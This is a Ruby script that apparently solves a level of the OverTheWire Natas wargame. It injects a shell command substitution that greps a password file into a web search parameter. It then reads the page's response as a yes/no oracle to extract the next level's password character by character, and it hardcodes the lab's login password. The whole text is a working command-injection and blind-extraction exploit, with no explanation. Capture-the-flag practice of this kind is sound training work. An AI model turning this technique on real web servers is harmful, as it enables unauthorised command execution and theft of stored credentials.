require 'net/http'

allChars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""
32.times do |i|
  allChars.each do |c|
    uri = URI.parse("http://natas16.natas.labs.overthewire.org/index.php")
    params = {'needle' => "Americans$(grep ^#{password + c} /etc/natas_webpass/natas17)"}
    http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

    resp = http.request(req)
    unless resp.body.include?("Americans")
      password += c
      break
    end
  end
  puts "Password (#{i}/32): #{password}"
end

